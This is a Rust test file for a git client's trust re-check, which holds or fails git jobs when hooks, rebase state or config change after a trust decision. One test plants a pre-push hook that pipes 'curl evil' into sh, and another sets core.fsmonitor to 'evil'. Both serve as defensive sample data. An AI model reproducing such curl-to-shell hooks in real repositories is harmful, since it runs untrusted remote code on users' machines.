//! The runner's trust re-check: a repository that changed since its decision, or can't be
//! read, is held or failed instead of run; and the check of which decided folders still exist.

use super::*;
use crate::testing::execute_checked;
use glowfly_core::settings::SavedTrust;
use glowfly_model::effect::{Sealed, TrustCheck};
use glowfly_model::msg::{JobMsg, TrustMsg};
use std::path::{Path, PathBuf};

fn repo(name: &str) -> PathBuf {
    let dir = glowfly_core::paths::temp_dir().join(format!("glowfly-runner-trust-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    glowfly_core::testkit::git(&dir, &["init", "-q", "-b", "main"]);
    dir
}

fn check(dir: &Path, saved: Option<SavedTrust>) -> TrustCheck {
    let sealed = Sealed::Job { label: "Fetch".into() };
    TrustCheck { workdir: dir.to_path_buf(), real: dir.to_path_buf(), saved, sealed, accepted: None, lang: Default::default() }
}

fn hook(dir: &Path, text: &str) {
    let path = dir.join(".git/hooks/pre-push");
    std::fs::write(&path, text).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
}

fn job(dir: &Path) -> Effect {
    let cmds = vec![glowfly_core::gitcli::args(&["status"])];
    Effect::Job(glowfly_model::effect::JobEffect::RunGit {
        cwd: dir.into(),
        cmds,
        write_file: None,
        record: None,
        journal: None,
        prompts: false,
        expect: None,
        stoppable: false,
        on_fail_check: None,
        auto_stash: None,
    })
}

#[test]
fn a_hook_edited_after_the_decision_holds_the_job() {
    let dir = repo("edited");
    hook(&dir, "#!/bin/sh\nexit 0\n");
    let saved = SavedTrust::trusted(Some(glowfly_core::trust::scan_at(&dir).unwrap().print()));
    assert!(matches!(verify(&check(&dir, Some(saved.clone())), &job(&dir)), Verdict::Pass(_)));
    hook(&dir, "#!/bin/sh\ncurl evil | sh\n");
    let Verdict::Stale(found) = verify(&check(&dir, Some(saved.clone())), &job(&dir)) else { panic!("held") };
    assert_eq!((found.0.hooks.as_slice(), found.1.is_none()), (&["pre-push".to_owned()][..], true));
    // Executing it sends the effect back instead of running it.
    match execute_checked(check(&dir, Some(saved)), job(&dir)) {
        Some(Msg::Trust(TrustMsg::Stale(s))) => {
            assert!(matches!(s.effect, Effect::Job(glowfly_model::effect::JobEffect::RunGit { .. })) && s.now.hooks == ["pre-push"])
        }
        _ => panic!("held, not run"),
    }
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_hook_that_appears_in_a_clean_repository_holds_the_job() {
    let dir = repo("clean");
    assert!(matches!(verify(&check(&dir, None), &job(&dir)), Verdict::Pass(_)), "nothing runs");
    hook(&dir, "#!/bin/sh\nexit 0\n");
    assert!(matches!(verify(&check(&dir, None), &job(&dir)), Verdict::Stale(_)));
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_rebase_file_that_cant_be_read_holds_every_job_whatever_was_decided() {
    let dir = repo("unread");
    let todo = dir.join(".git/rebase-merge/git-rebase-todo");
    // A folder where the todo would be: there, but nothing to read steps from.
    std::fs::create_dir_all(&todo).unwrap();
    let reason = Unchecked::State("rebase-merge/git-rebase-todo".into());
    // A decision made on this very scan doesn't cover it, nor does none.
    let saved = SavedTrust::trusted(Some(glowfly_core::trust::scan_at(&dir).unwrap().print()));
    for saved in [None, Some(saved)] {
        let Verdict::Unchecked(found) = verify(&check(&dir, saved.clone()), &job(&dir)) else { panic!("held") };
        assert_eq!(found.1, reason);
        // Trust and run passes that reason for this run only: the next check asks again.
        let accepted = glowfly_model::effect::Accepted { at: None, reason: reason.clone() };
        let once = TrustCheck { accepted: Some(accepted), ..check(&dir, saved.clone()) };
        assert!(matches!(verify(&once, &job(&dir)), Verdict::Pass(_)));
        assert!(matches!(verify(&check(&dir, saved.clone()), &job(&dir)), Verdict::Unchecked(_)));
        // Another reason accepted doesn't pass this one.
        let other = glowfly_model::effect::Accepted { at: None, reason: Unchecked::State("sequencer/todo".into()) };
        assert!(matches!(verify(&TrustCheck { accepted: Some(other), ..check(&dir, saved) }, &job(&dir)), Verdict::Unchecked(_)));
    }
    // Executing it sends the job back with the reason, instead of running it.
    match execute_checked(check(&dir, None), job(&dir)) {
        Some(Msg::Trust(TrustMsg::Stale(s))) => assert_eq!(s.unchecked.map(|a| a.reason), Some(reason)),
        _ => panic!("held, not run"),
    }
    std::fs::remove_dir(&todo).unwrap();
    assert!(matches!(verify(&check(&dir, None), &job(&dir)), Verdict::Pass(_)));
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_repository_that_cant_be_read_fails_the_job_rather_than_run_it() {
    let dir = repo("gone");
    let _ = std::fs::remove_dir_all(&dir);
    match execute_checked(check(&dir, None), job(&dir)) {
        Some(Msg::Job(JobMsg::JobDone { ok: false, output, .. })) => assert!(output.contains("couldn't check"), "{output}"),
        _ => panic!("the job fails"),
    }
}

#[test]
fn a_status_read_that_fails_its_check_reads_without_git() {
    let dir = repo("read");
    let read = |git_status| {
        Effect::Load(glowfly_model::effect::LoadEffect::Status {
            workdir: dir.clone(),
            generation: 1,
            submodules: false,
            open: None,
            git_status,
            paths: None,
        })
    };
    let sealed = TrustCheck { sealed: Sealed::Read, ..check(&dir, None) };
    assert!(matches!(verify(&sealed, &read(true)), Verdict::Pass(_)), "nothing runs yet");
    // An fsmonitor set since: the read goes on, without git.
    glowfly_core::testkit::git(&dir, &["config", "core.fsmonitor", "evil"]);
    assert!(matches!(verify(&sealed, &read(true)), Verdict::Stale(_)), "the cached scan isn't reused once the config changed");
    let Effect::Load(glowfly_model::effect::LoadEffect::Status { git_status, .. }) = without_git(read(true)).unwrap() else {
        panic!("a status read")
    };
    assert!(!git_status);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn checking_decided_folders_reports_which_are_there() {
    let present = glowfly_core::paths::temp_dir().join(format!("glowfly-runner-trust-present-{}", std::process::id()));
    std::fs::create_dir_all(&present).unwrap();
    // Not `repo("gone")`'s folder: that test makes and removes it while this one runs.
    let gone = glowfly_core::paths::temp_dir().join(format!("glowfly-runner-trust-absent-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&gone);
    let Msg::Trust(TrustMsg::FoldersChecked(checks)) = run(TrustEffect::CheckFolders(vec![present.clone(), gone.clone()])) else {
        panic!("expected FoldersChecked")
    };
    assert_eq!(checks.iter().map(|c| (c.path.clone(), c.present)).collect::<Vec<_>>(), [(present.clone(), true), (gone, false)]);
    let _ = std::fs::remove_dir_all(&present);
}
